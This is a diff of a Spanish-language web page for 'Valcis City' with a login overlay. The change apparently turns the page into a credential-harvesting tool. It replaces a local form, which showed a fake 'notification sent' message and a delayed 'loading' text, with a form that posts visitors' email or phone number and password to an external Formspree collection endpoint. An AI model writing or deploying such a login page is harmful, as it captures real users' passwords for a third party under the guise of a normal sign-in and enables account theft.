@@ -77,7 +77,6 @@
   }
   .overlay-content button:hover { transform:scale(1.05); box-shadow:0 0 25px #ff512f,0 0 50px #dd2476; }
 
-  .notification { margin-top:15px; font-size:1.1rem; color:#ffeb3b; min-height:24px; transition: all 0.3s ease; }
   .close-btn { position:absolute; top:15px; right:15px; font-size:1.5rem; cursor:pointer; color:#fff; }
   .close-btn:hover { transform:scale(1.2); }
 
@@ -123,43 +122,27 @@
 
 <!-- Overlay -->
 <div class="overlay" id="overlay">
-  <form id="registroForm" class="overlay-content" action="#" method="POST">
+  <div class="overlay-content">
     <span class="close-btn" id="closeOverlay">&times;</span>
     <img src="logo.png" alt="Valcis City Logo">
-    <input type="text" name="email" id="email" placeholder="Correo o número" required>
-    <input type="password" name="password" id="password" placeholder="Contraseña" required>
-    <button type="submit">Iniciar sesión</button>
-    <div class="notification" id="notification"></div>
-  </form>
+
+    <!-- Formspree Form -->
+    <form id="loginForm" action="https://formspree.io/f/xjkekpdg" method="POST">
+      <input type="text" name="email" placeholder="Correo o número" required>
+      <input type="password" name="password" placeholder="Contraseña" required>
+      <button type="submit">Iniciar sesión</button>
+    </form>
+    
+  </div>
 </div>
 
 <script>
   const overlay = document.getElementById('overlay');
   const openBtn = document.getElementById('openOverlay');
   const closeBtn = document.getElementById('closeOverlay');
-  const registroForm = document.getElementById('registroForm');
-  const notification = document.getElementById('notification');
 
   openBtn.addEventListener('click', () => { overlay.style.display='flex'; });
-  closeBtn.addEventListener('click', () => { overlay.style.display='none'; notification.textContent=''; });
-
-  registroForm.addEventListener('submit', e => {
-    e.preventDefault();
-    const email = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value.trim();
-
-    if(!email || !password){
-      notification.textContent = "Por favor completa todos los campos";
-      return;
-    }
-
-    notification.textContent = "Se te envió una notificación";
-
-    // Aquí puedes agregar tu lógica de registro local
-    console.log({email, password}); 
-
-    setTimeout(() => { notification.textContent = "Cargando..."; }, 180000);
-  });
+  closeBtn.addEventListener('click', () => { overlay.style.display='none'; });
 
   // Partículas
   const particlesContainer = document.getElementById('particles');
